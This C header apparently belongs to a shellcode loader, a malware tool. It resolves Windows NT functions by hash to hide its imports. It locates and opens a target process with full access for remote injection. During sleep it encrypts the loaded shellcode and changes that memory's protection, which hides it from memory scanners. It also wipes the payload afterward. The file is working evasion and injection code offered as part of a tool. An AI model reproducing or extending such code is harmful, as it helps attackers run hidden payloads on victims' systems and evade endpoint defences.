#pragma once
#include "../../includes/core/core.h"
#include "../../includes/crypt/crypt.h"
#include "../../includes/core/nt.h"
#include "../../includes/apis/apis.h"
#include <tlhelp32.h>






#ifdef REMOTE

static inline void resolve_snapshot_apis(void) {
    if (!g_ldr->apis->NtQuerySystemInformation)
        g_ldr->apis->NtQuerySystemInformation = (pNtQuerySystemInformation)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTQUERYSYSTEMINFORMATION);
}


static inline HANDLE open_process_by_pid(DWORD pid) {
    HANDLE h = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0 };
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    g_ldr->apis->NtOpenProcess(&h, PROCESS_ALL_ACCESS, &oa, &cid);
    return h;
}

#define SystemProcessInformation 5

static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
    ULONG bufferSize = 1024 * 1024;
    PVOID buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
    ULONG returnLength = 0;
    NTSTATUS status;

    while ((status = g_ldr->apis->NtQuerySystemInformation(
        SystemProcessInformation,
        buffer,
        bufferSize,
        &returnLength)) == STATUS_INFO_LENGTH_MISMATCH) {
        g_ldr->apis->LocalFree(buffer);
        bufferSize = returnLength + 4096;
        buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
    }

    if (status != 0) {
        g_ldr->apis->LocalFree(buffer);
        return NULL;
    }

    HANDLE hProc = NULL;
    PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)buffer;

    while (1) {
        if (proc->ImageName.Buffer && _wcsicmp(proc->ImageName.Buffer, name) == 0) {
            hProc = open_process_by_pid((DWORD)(ULONG_PTR)proc->UniqueProcessId);
            if (hProc) {
                *chosenPid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
                break;
            }
        }

        if (proc->NextEntryOffset == 0)
            break;
        proc = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
    }

    g_ldr->apis->LocalFree(buffer);
    return hProc;
}

static inline HANDLE resolve_target_process(PDWORD chosenPid) {
    if (g_ldr->config->remoteSettings.pid != 0) {
        HANDLE h = open_process_by_pid(g_ldr->config->remoteSettings.pid);
        if (h) {
            *chosenPid = g_ldr->config->remoteSettings.pid;
            return h;
        }
        DBGA("[!] Failed to open PID %lu\n", g_ldr->config->remoteSettings.pid);
    }

    if (g_ldr->config->remoteSettings.ProcessName[0] != L'\0') {
        HANDLE h = open_process_by_name(g_ldr->config->remoteSettings.ProcessName, chosenPid);
        if (h)
            return h;
        DBGA("[!] Failed to open process by name\n");
    }

    return NULL;
}

#endif



static inline PPEB GetPeb() {
#if defined(_WIN64) || defined(__x86_64__)
    return (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)|| defined(__i386__)
    return (PPEB)__readfsdword(0x30);
#endif
}

static inline BOOL ensure_sleep_apis() {
    if (!g_ldr->apis->NtCreateTimer)
        g_ldr->apis->NtCreateTimer = (pNtCreateTimer)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCREATETIMER);
    if (!g_ldr->apis->NtSetTimer)
        g_ldr->apis->NtSetTimer = (pNtSetTimer)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTSETTIMER);
    if (!g_ldr->apis->NtWaitForSingleObject)
        g_ldr->apis->NtWaitForSingleObject = (pNtWaitForSingleObject)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTWAITFORSINGLEOBJECT);
    if(!g_ldr->apis->NtCloseHandle)
        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);
    if (!g_ldr->apis->NtProtectVirtualMemory)
        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTPROTECTVIRTUALMEMORY);
}

static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
    if (time == 0) return;
    ensure_sleep_apis();
    DBGA("[*] Sleeping for %lu Seconds\n", time);
   
#ifdef LOCAL
    DBGA("[*] Encrypting shellcode\n");
    PVOID protAddr = Shellcode;
    SIZE_T protSize = ShellcodeSize;
    ULONG old;
    g_ldr->apis->NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize, PAGE_READWRITE, &old);
    
    crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
        sizeof(g_ldr->config->EncryptionKey),
        g_ldr->config->Nonce,
        sizeof(g_ldr->config->Nonce));
#endif
    

    HANDLE hTimer = NULL;
    g_ldr->apis->NtCreateTimer(&hTimer, TIMER_ALL_ACCESS, NULL, 0);
    if (!hTimer) return;
    LARGE_INTEGER li;
    li.QuadPart = -(LONGLONG)time * 10000000LL;
    g_ldr->apis->NtSetTimer(hTimer, &li, NULL, NULL, FALSE, 0, NULL);
    g_ldr->apis->NtWaitForSingleObject(hTimer, FALSE, NULL);
    g_ldr->apis->NtCloseHandle(hTimer);
#ifdef LOCAL
    DBGA("[*] Decrypting shellcode\n");
    crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
        sizeof(g_ldr->config->EncryptionKey),
        g_ldr->config->Nonce,
        sizeof(g_ldr->config->Nonce));
    protAddr = Shellcode;
    protSize = ShellcodeSize;
    g_ldr->apis->NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize, old, &old);
#endif
    return;
}

static inline void ldr_sleep(DWORD time) {
    do_sleep(time, NULL, 0);
}

static inline void ldr_sleep_encrypt_heap(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
    do_sleep(time, Shellcode, ShellcodeSize);
}


static inline void clear_payload(LPVOID addr, DWORD size) {
    volatile unsigned char* p = (volatile unsigned char*)addr;
    for (DWORD i = 0; i < size; i++) p[i] = 0;
#ifndef PAYLOAD_SECTION_DATA
    g_ldr->apis->LocalFree(addr);
#endif
}